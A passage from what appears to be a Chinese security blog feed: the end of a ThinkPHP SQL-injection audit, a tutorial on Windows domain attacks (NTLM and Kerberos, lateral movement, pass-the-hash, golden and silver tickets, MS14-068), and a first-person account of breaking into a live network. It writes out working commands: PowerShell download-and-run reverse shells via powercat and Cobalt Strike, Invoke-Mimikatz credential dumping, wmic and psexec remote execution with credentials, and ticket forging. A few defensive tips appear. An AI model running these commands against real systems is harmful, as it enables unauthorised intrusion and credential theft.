and(updatexml(1,concat(0x7e,(select user())),0))</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/13.png" alt="" loading="lazy"></p><h4 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a><strong>缓存漏洞</strong></h4><p>在ThinkPHP3.2中，缓存函数有F方法和S方法，两个方法有什么区别呢，官方介绍如下</p><pre><code>F方法：相当于PHP自带的file_put_content和file_get_content函数，没有太多存在时间的概念，是文件存储数据的方式。常用于文件配置。S方法：文件缓存，有生命时长，时间到期后缓存内容会得到更新。常用于单页面data缓存。</code></pre><p>这里F方法就不介绍了，直接看S方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">S</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进查看S方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/14.png" alt="" loading="lazy"></p><p>set方法写入缓存</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/15.png" alt="" loading="lazy"></p><p>跟进filename方法，此方法获取写入文件的路径，保存在../Application/Runtime/Temp目录下</p><pre class=" language-php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">filename</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$name</span>    <span class="token operator">=</span>    <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DATA_CACHE_KEY'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DATA_CACHE_SUBDIR'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 使用子目录</span>            <span class="token variable">$dir</span>   <span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DATA_PATH_LEVEL'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$dir</span>    <span class="token punctuation">.</span><span class="token operator">=</span>    <span class="token variable">$name</span><span class="token punctuation">{</span><span class="token variable">$i</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'temp'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'temp'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$dir</span><span class="token punctuation">,</span><span class="token number">0755</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$filename</span>    <span class="token operator">=</span>    <span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$filename</span>    <span class="token operator">=</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'temp'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>并将S传入的name进行md5值作为文件名，最终通过file_put_contents函数写入文件。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/16.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;where注入&quot;&gt;&lt;a href=&quot;#where注入&quot; class=&quot;headerlink&quot; title=&quot;where注入&quot;&gt;&lt;/a&gt;&lt;strong&gt;where注入&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在控制器中，写个demo，利用字符串方式作为where传参时存在注
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>内网域渗透知识总结</title>
    <link href="http://yoursite.com/2019/12/31/%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/12/31/%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</id>
    <published>2019-12-31T03:30:29.000Z</published>
    <updated>2020-04-29T05:17:33.373Z</updated>
    
    <content type="html"><![CDATA[<h4 id="NTML协议"><a href="#NTML协议" class="headerlink" title="NTML协议"></a><strong>NTML协议</strong></h4><p>在工作组中，密码hash保存在本地的SAM文件中(%SystemRoot%\system32\config\sam)，在域里保存在ntds.dit文件中，hash的格式为：<code>用户名称:SID:LM-Hash值:NT-Hash值</code></p><pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:32057716c8bd0647d9197a9db0b041eb:::</code></pre><p>500冒号后面的是LM hash，32057716c8bd0647d9197a9db0b041eb是ntml hash</p><h5 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a><strong>LM Hash</strong></h5><p>LM Hash的全称是LAN Manager Hash，如果明文是<code>dbnames</code>，先要全部转换成大写，然后将大写字符串转换成16进制，如果明文大写转换的二进制不足14个字节，需要用0在后面添加到14个字节</p><pre><code>44424e414d455300000000000000    dbnames的16进制为44424e414d4553</code></pre><p>由于44424e414d4553转换二进制为8字节，所以这两个8字节数据要用魔术字符串<code>KGS!@#$%</code>DES加密</p><pre><code>4B47532140232425     为&#39;KGS!@#$%&#39;的16进制</code></pre><p>将得到的2个8字节作为key对KGS!@#$%进行des加密，可以利用安全客的一篇文章进行<a href="https://www.anquanke.com/post/id/193149#h3-2" target="_blank" rel="noopener">des加密</a></p><pre><code>44424e414d4553作为key为&#39;KGS!@#$%&#39;进行des加密：c8b9d6dc8e553d6300000000000000作为key为&#39;KGS!@#$%&#39;进行des加密：aad3b435b51404ee</code></pre><h5 id="NTML-Hash"><a href="#NTML-Hash" class="headerlink" title="NTML Hash"></a><strong>NTML Hash</strong></h5><p>从Windows Vista开始，密码默认情况是只有存储NTML Hash，LM Hash不会存在，在NTML Hash中，先将字符串进行16进制转换，然后在转换成unicode字符串，最后使用MD4加密算法对Unicode进行加密，所以LM Hash跟NTML相比，LM明文大小写不敏感，可以判断明文是否小于8位，不使用‘KGS!@#$%’作为key进行des加密，而NTML采用单向加密方式(MD4)</p><h5 id="NTML认证协议"><a href="#NTML认证协议" class="headerlink" title="NTML认证协议"></a><strong>NTML认证协议</strong></h5><p>NTML协议认证分为三部分：协商、质询、身份验证验证</p><pre><code>                            1.协商Client &lt;----------------------------------------------------&gt;server                            2.质询(challenge)Client &lt;----------------------------------------------------&gt;server                            3.身份验证Client &lt;----------------------------------------------------&gt;server</code></pre><p>NTML协议认证过程：</p><p>1.用户输入账号密码，客户端中包含明文用用户名向服务端发起请求</p><p>2.服务端接收到客户端的请求，会生成一个challenge 16位随机数，使用存储的NTML Hash加密challenge，生成challenge1，然后将challenge的16位明文随机数发送给客户端</p><p>3.客户端接收到challenge后，使用用户登录的密码hash加密challenge生成response(challenge2)，将这个response发送给客户端</p><p>4.服务端接收到response，对challenge1和challenge2进行比较，相同的话就验证成功</p><h5 id="NTLM-v1与NTLM-v2"><a href="#NTLM-v1与NTLM-v2" class="headerlink" title="NTLM v1与NTLM v2"></a><strong>NTLM v1与NTLM v2</strong></h5><p>challenge：NTML v1是8的随机数；NTML v2是16位的随机数</p><p>Net-NTML Hash：</p><p>1.NTML v1采用的是DES加密，在16字节后面填充5个0，组成21字节，然后分成3组7个字节的，并在每7个字节后面填充1个0，成为3个8字节的DES密钥，加密上诉步骤2(server)发来的challenge，组成24字节的密文。</p><p>2.NTML v2采用的HMAC-MD5加密</p><h4 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a><strong>Kerberos协议</strong></h4><p>在域环境中，主要采用的是kerberos协议，主要有下面几个角色</p><p>1.AS：为客户端生成TGT服务</p><p>2.TGS：为客户端生成某个服务的ticket</p><p>3.KDC：安全认证中票据生成管理服务，里面包含AS和TGS</p><p>4.AD：存储整个域内的所有计算机，用户等信息</p><h5 id="Kerberos协议认证过程"><a href="#Kerberos协议认证过程" class="headerlink" title="Kerberos协议认证过程"></a><strong>Kerberos协议认证过程</strong></h5><p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201912/31/102901ze0er0rhuutesc5y.png.thumb.jpg" alt="1" loading="lazy"></p><p>1.客户端向KDC(AS)发起一个认证请求(KRB_AS_REQ)，在请求的过程中，是通过用户的密码hash加密的时间戳，然后发送给AS服务器，AS服务器接收到后，采用服务器那边的密码hash进行解密这个时间戳，解密成功后，并且时间戳在一定时间范围，说明认证成功。<br> 2.AS对比用户是否在本地数据库中，使用客户端的hash进行解密，正确就返回krbtgt的密码hash加密的TGT票据(到期时间一般为8小时)，用户是无法解密这个TGT票据的，但是有了krbtgt的hash，就可以伪造’黄金票据’。还要返回一个由客户端用户ntml hash加密的Session Key(sessionkey1)，Session  Key是KDC接收请求后的随机生成的字符(KRB_AS_REP)。<br> 3.客户端用自己的密码hash解密Session Key，TGT是KDC加密的，Client无法解密，Client拿着解密出来的SessionKey去加密时间戳和TGT发送给TGS换取访问Server的票据(KRB_TGS_REQ)。<br> 4.TGS收到Client的请求后，会验证是否存在客户端要访问的这个服务，存在的话KDC使用krbtgt的密码hash对TGT进行解密，然后会查看TGT中的时间戳，看是否TGT失效，如果解密成功的TGT没有失效，向客户端发送通过sessionkey1加密的Session_key和ticket票据，在TGSREP中，用的是服务的hash加密ticket的，所有我们拥有这个服务的hash就可以制作一个ticket(即白银票据)(KRB_TGS_REP)。<br> 5.客户端拿着自己sessionkey1解密的Session_Key(sessionkey2)，然后把sessionkey2加密的时间戳和ticket发送个Server去访问服务，认证通过就可以访问(KRB_AP_REQ)。<br> 6.服务使用自己的hash去解密ticket票据，得到sessionkey2，在用sessionkey2去解密时间戳，解密成功，就用PAC去KDC问客户端是否有访问的权限，域控解密PAC，用于让客户端识别是否访问正确的服务端(KRB_AP_REP)。</p><h4 id="内网横向移动的方法"><a href="#内网横向移动的方法" class="headerlink" title="内网横向移动的方法"></a><strong>内网横向移动的方法</strong></h4><h5 id="ipc连接"><a href="#ipc连接" class="headerlink" title="ipc连接"></a><strong>ipc连接</strong></h5><pre><code>net use \\192.168.1.232\C$ admin123456 /user:fanxing.com\fanxing</code></pre><p>复制文件到主机上</p><pre><code>copy 1.bat \\192.168.1.232\c$\tools</code></pre><p>获取服务器的时间</p><pre><code>net time \\192.168.1.232</code></pre><p>创建计划任务，20:05执行1.bat文件，cobaltstrike上线成功</p><pre><code>at \\192.168.1.232 20:05 c:\tools\1.bat</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/3.png" alt="" loading="lazy"></p><p>下面是ipc连接当中常见的错误号：</p><pre><code>错误号5：拒绝访问---&gt;使用的权限太低，需要提权错误号51：Windows无法找到网络路径，网络有问题错误号53：找不到网络路径，ip地址错误、目标未开机、目标lanmanserver服务未开启、目标有防火墙(端口过滤)错误号67：找不到网络名-&gt;你的lanmanworkstation服务未启动或者目标删除了ipc$错误号1219：提供的凭据与已存在的凭据集冲突-&gt;你已经和对方建立了一个ipc，请删除在连接错误号1326：未知的用户名或错误密码错误号1792：试图登录，但是网络登录服务没启动-&gt;目标BetLogon服务未启动错误号2242：此用户的密码已经过期-&gt;目标有账号策略，强制定期要求更改密码</code></pre><h5 id="schtasks创建计划任务"><a href="#schtasks创建计划任务" class="headerlink" title="schtasks创建计划任务"></a><strong>schtasks创建计划任务</strong></h5><p>设置每天晚上8:40执行1.bat文件</p><pre><code>schtasks /create /s 192.168.1.232 /u fanxing.com\fanxing /p admin@163.com /ru &quot;SYSTEM&quot; /tn fanxing /sc DAILY /st 20:40  /tr c:\tools\1.bat /F</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/4.png" alt="" loading="lazy"></p><h5 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a><strong>WMI</strong></h5><p>wmi服务需要开启135端口，这个是默认开启的。</p><pre><code>wmic /node:192.168.1.232 /user:fanxing.com\fanxing /password:admin@163.com process call create &quot;cmd /c 1.exe&quot;</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/5.png" alt="" loading="lazy"></p><p>使用wmic没有任何回显，可以wmicexec.vbs解决无回显的问题，或者获取一个半交互式shell。</p><pre><code>cscript wmiexec.vbs /cmd 192.168.1.232 fanxing.com\fanxing admin@163.com whoami</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/6.png" alt="" loading="lazy"></p><h5 id="pstools"><a href="#pstools" class="headerlink" title="pstools"></a><strong>pstools</strong></h5><p>pstools中有13个小工具，这里主要利用psexec进行远程执行命令，唯一的缺点就是会开启一个服务，容易被管理员发现。</p><p>在ipc建立连接的时候，可以直接使用psexec:</p><pre><code>psexec.exe \\192.168.1.232 -h cmd /c &quot;whoami&quot;</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/7.png" alt="" loading="lazy"></p><p>当ipc没有连接时</p><pre><code>Psexec.exe \\192.168.1.232 -u fanxing.com\fanxing -p admin@163.com -h cmd /c &quot;whoami&quot;</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/8.png" alt="" loading="lazy"></p><p>使用metasploit执行</p><pre><code>use auxiliary/admin/smb/p**ec_commandset rhosts 192.168.1.232set smbuser fanxingset smbpass admin@163.comset smbdomain fanxing.comset command whoami</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/9.png" alt="" loading="lazy"></p><h5 id="hash传递-PTH"><a href="#hash传递-PTH" class="headerlink" title="hash传递(PTH)"></a><strong>hash传递(PTH)</strong></h5><p>hash传递是通过密码的hash访问主机或者服务，不需要明文登录。hash的原理，出现在上面讲的NTML认证过程的challenge。利用metasploit：</p><pre><code>use exploit/windows/smb/psexecset rhosts 192.168.50.233set SMBPass 32057716c8bd0647d9197a9db0b041ebset SMBUser administratorset SMBDomain fanxing.com</code></pre><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a><strong>黄金票据</strong></h4><p>黄金票据是AS颁发给Client的TGT票据(TGT的有效时间为20分钟)，是通过域kerberos账户(KRBTGT)加密的。实现原理就是跳过了AS的认证过程，直接向KDC的TGS服务证明通过了AS服务。一般黄金票据都是域控的权限掉了的时候，修改了域控的密码，而krbtgt的密码没有被修改，就可以重新获取到域控权限。</p><p>满足黄金票据的条件有：</p><p>1.域的名称</p><p>2.域的SID值</p><p>3.域中KRBTGT的密码hash</p><p>4.伪造的用户名</p><p>在金票的利用过程中，可以使用mimikatz，cobaltstrike，metasploit来伪造。</p><h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><strong>Mimikatz</strong></h5><p>导出krbtgt的NTML Hash</p><pre><code>privilege::debug      #提权lsadump::dcsync /domain:fanxing.com /user:krbtgt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/10.png" alt="" loading="lazy"></p><p>获取域的SID值，不要后面的-500</p><pre><code>whoami /all</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/11.png" alt="" loading="lazy"></p><p>伪造金票</p><pre><code>kerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /aes256:3df036f90aaf3a63a5cce96fc753f08beb5a2e61946e17cc7d5e6ce04b651b89 /user:fanxing /ticket:gold.kirbi</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/12.png" alt="" loading="lazy"></p><p>导入Golden Ticket</p><pre><code>kerberos::ptt c:\users\test\gold.kirbi</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/13.png" alt="" loading="lazy"></p><p>可以使用dir访问域控目录，要输入主机名，使用ip还是访问不到</p><pre><code>dir \\WIN-M34UCFJIPNQ\c$</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/14.png" alt="" loading="lazy"></p><p>mimikatz还有另外一中方法</p><pre><code>kerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /rc4:8b3955c065502e33716d555d4421a723 /user:fanxing /ptt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/15.png" alt="" loading="lazy"></p><h5 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a><strong>CobaltStrike</strong></h5><p>在上线之后-&gt;执行-&gt;黄金票据</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/16.png" alt="" loading="lazy"></p><h5 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><strong>Metasploit</strong></h5><p>msf制作金票</p><pre><code>load kiwi</code></pre><p>生成Golden Ticket</p><pre><code>golden_ticket_create -d fanxing.com -k 8b3955c065502e33716d555d4421a723 -s S-1-5-21-3408186607-3793295459-3581146574 -u fanxing -t /tmp/golden.ticket</code></pre><p>将票据导入内存中</p><pre><code>kerberos_ticket_use /tmp/golden.ticket</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/17.png" alt="" loading="lazy"></p><p>dir访问目录成功</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/18.png" alt="" loading="lazy"></p><p>金票的创建，需要krbtgt的密码ntml hash，对于防御，只要定期的修改krbtgt的密码，就能使金票失效。</p><h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a><strong>白银票据</strong></h4><p>白银票据是TGS颁发给Client的ST票据，根据kerberos协议第5步，Server会对Clinet的ST票据利用Client的hash解密，所以这个过程不需要经过KDC，而且只能访问Server的服务一次。</p><p>满足一下条件，即可以伪造银票：</p><p>1.域的名称</p><p>2.域的SID值</p><p>3.域服务的NTML Hash</p><p>4.要伪造的用户名</p><p>5.目标服务器的kerberos服务</p><p>常用的服务名有</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/19.png" alt="" loading="lazy"></p><p>伪造银票</p><pre><code>kerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /target:WIN-M34UCFJIPNQ.fanxing.com /service:cifs /rc4:dcd87fc42d9d8ac03dec5931a55ddd59 /user:fanxing /ptt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/20.png" alt="" loading="lazy"></p><p>对于银票的防御措施可以开启PAC，PAC只能KDC制作和查看，在注册表中添加一个ValidateKdcPacSignature为1</p><pre><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/21.png" alt="" loading="lazy"></p><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a><strong>MS14-068</strong></h4><p>Client向AS申请一张不包含PAC的TGT票据，会伪造一个PAC，在TGS_REP中，对伪造的PAC验证成功后，会返回一个新的TGT票据。</p><p>通过<a href="https://github.com/abatchy17/Window**ploits/tree/master/MS14-068" target="_blank" rel="noopener">MS14-068exp</a>利用</p><pre><code>MS14-068.exe -u 当前域用户@域名称 -p 当前域用户密码 -s sid值 -d 域控ip</code></pre><p>sid值通过whoami /all获取</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/22.png" alt="" loading="lazy"></p><p>然后会在目录下生成一个证书，利用mimikatz</p><pre><code>kerberos::ptc C:\wwwroot\TGT_xxxxx@fanxing.com.ccache</code></pre><p>就可以使用dir访问到域控的目录</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/23.png" alt="" loading="lazy"></p><p>对于ms14-068的防御可以打补丁KB3011780和使用winserver2012</p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://www.anquanke.com/member/143805" target="_blank" rel="noopener">https://www.anquanke.com/member/143805</a></p><p>2.<a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/" target="_blank" rel="noopener">https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;NTML协议&quot;&gt;&lt;a href=&quot;#NTML协议&quot; class=&quot;headerlink&quot; title=&quot;NTML协议&quot;&gt;&lt;/a&gt;&lt;strong&gt;NTML协议&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在工作组中，密码hash保存在本地的SAM文件中(%SystemRoot%
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>我的一次内网域渗透实战</title>
    <link href="http://yoursite.com/2019/08/14/%E6%88%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    <id>http://yoursite.com/2019/08/14/%E6%88%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/</id>
    <published>2019-08-14T09:34:05.000Z</published>
    <updated>2020-04-29T07:16:59.297Z</updated>
    
    <content type="html"><![CDATA[<h4 id="CobaltStrike反弹shell"><a href="#CobaltStrike反弹shell" class="headerlink" title="CobaltStrike反弹shell"></a><strong>CobaltStrike反弹shell</strong></h4><p>通过CNVD-C-2019-48814获取到shell，由于这个网站存在ETES杀毒软件，写入jsp木马或者利用vbs，certutil，powershell下载msf木马均会被杀，这里可以利用powershell反弹shell的形式在自己的vps上获取到一个shell。具体这个漏洞怎么利用我不说了，网上很多复现文章。<br>在cobaltstrike生成一段powershell代码，插入payload</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/1.png" alt="" loading="lazy"></p><p>执行payload就会在cs上获取到一个会话</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/2.png" alt="" loading="lazy"></p><p>将cobaltstrike上的会话移到metasploit上(怎么移植，网上有很多教程)<br>在metasploit上接收到shell</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/3.png" alt="" loading="lazy"></p><h4 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a><strong>内网信息收集</strong></h4><p>查询域名称：net view /domain<br>查询域内计算机：net view /doamin:xx<br>查询域控制器时间：net time /domain<br>查询域管理用户：net group “domain admins” /domain<br>得到域控制主机名：net group “domain controllers” /domain<br>…..<br>获取域控主机名：net group “domain controllers” /domain</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/4.png" alt="" loading="lazy"></p><p>通过ping主机名获取域控ip地址</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/5.png" alt="" loading="lazy"></p><p>补丁情况：systeminfo</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/6.png" alt="" loading="lazy"></p><p>MS14-068打了补丁，无奈只能上mimikatz读取密码，但是有eset杀毒软件，一上传就被杀了，有没有免杀的mimikatz，幸好powershell没被拦截，通过Invoke-Mimikatz读取密码。</p><p>本地nc监听本地35602端口：</p><pre class=" language-shell"><code class="language-shell">nc -lvvp 35602</code></pre><p>在burpsuite上执行powercat反弹shell</p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>powercat <span class="token operator">-</span>c ip地址 <span class="token operator">-</span>p 端口 <span class="token operator">-</span>e cmd</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/7.png" alt="" loading="lazy"></p><p>Invoke-Mimikatz读取密码</p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/8.png" alt="" loading="lazy"></p><p>成功读取到域控的管理员账号密码</p><h4 id="拿下其他主机"><a href="#拿下其他主机" class="headerlink" title="拿下其他主机"></a><strong>拿下其他主机</strong></h4><p>有了域控账号密码，ip地址，就可以连接域控了，这里有很多种方法(ipc，wmic，p**ec，sc等等，这里我详细介绍3种方法)</p><h5 id="1-IPC连接"><a href="#1-IPC连接" class="headerlink" title="1.IPC连接"></a>1.IPC连接</h5><p>net use \ip地址\ipc$ 密码 /user:域控主机名\域控管理名<br>将文件copy到其他服务器上：copy 1.bat \ip地址\c$<br>获取服务器的时间：net time \ip地址<br>设置1.bat执行时间：at \ip地址 获取到的服务器时间 执行文件<br>删除ipc记录：net use \ip\ipc$ /del</p><h5 id="2-wmic"><a href="#2-wmic" class="headerlink" title="2.wmic"></a>2.wmic</h5><pre><code>wmic /node:ip地址 /user:用户名 /password:密码 process call create cmd.exe</code></pre><h5 id="3-psexec"><a href="#3-psexec" class="headerlink" title="3.psexec"></a>3.psexec</h5><pre><code>psexec \\ip地址 -u 用户名 -p 密码 cmd</code></pre><p>这里我通过wmic来连接，由于wmic没有回显</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/9.png" alt="" loading="lazy"></p><p>可以执行powershell反弹到cobaltstrike上，在移植到msf上面</p><pre class=" language-powershell"><code class="language-powershell">wmic <span class="token operator">/</span>node:ip地址 <span class="token operator">/</span>user:用户 <span class="token operator">/</span>password:密码 <span class="token keyword">process</span> call create <span class="token string">"cmd.exe /c powershell.exe -nop -w hidden -c \"</span><span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">'cs上生成的url'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>\<span class="token string">""</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/10.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/11.png" alt="" loading="lazy"></p><p>在域控中进行下信息收集，获取域成员机器</p><pre><code>查询所有域控制器：dsquery server查询域内计算机：dsquery computer查询域用户：dsquery user查询域用户所在域组：net user 域账号 